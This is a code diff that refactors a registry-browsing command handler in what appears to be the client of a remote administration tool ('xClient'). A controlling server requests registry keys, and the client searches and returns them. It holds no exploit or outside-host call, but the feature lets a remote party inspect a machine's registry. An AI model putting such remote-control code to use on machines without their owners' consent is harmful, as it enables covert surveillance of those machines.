@@ -19,20 +19,23 @@ namespace xClient.Core.Commands
 
                 xClient.Core.Packets.ClientPackets.GetRegistryKeysResponse responsePacket = new Packets.ClientPackets.GetRegistryKeysResponse();
 
-                // If the search parameters of the packet is null, the server is requesting to obtain the root keys.
-                if (packet.SearchParameters == null)
-                {
-                    packet.SearchParameters = new RegistrySeekerParams(RegistrySeeker.ROOT_KEYS, Enums.RegistrySearchAction.Keys | Enums.RegistrySearchAction.Values);
-                    responsePacket.IsRootKey = true;
-                }
-
                 seeker.SearchComplete += (object o, SearchCompletedEventArgs e) =>
-                        {
-                            responsePacket.Matches = e.Matches.ToArray();
-                            responsePacket.Execute(client);
-                        };
+                {
+                    responsePacket.Matches = e.Matches.ToArray();
 
-                seeker.Start(packet.SearchParameters);
+                    responsePacket.Execute(client);
+                };
+
+                // If the search parameters of the packet is null, the server is requesting to obtain the root keys.
+                if (packet.RootKeyNames == null)
+                {
+                    responsePacket.IsRootKey = true;
+                    seeker.Start(new RegistrySeekerParams(RegistrySeeker.ROOT_KEYS, Enums.RegistrySearchAction.Keys | Enums.RegistrySearchAction.Values));
+                }
+                else
+                {
+                    seeker.Start(packet.RootKeyNames);
+                }
             }
             catch
             { }
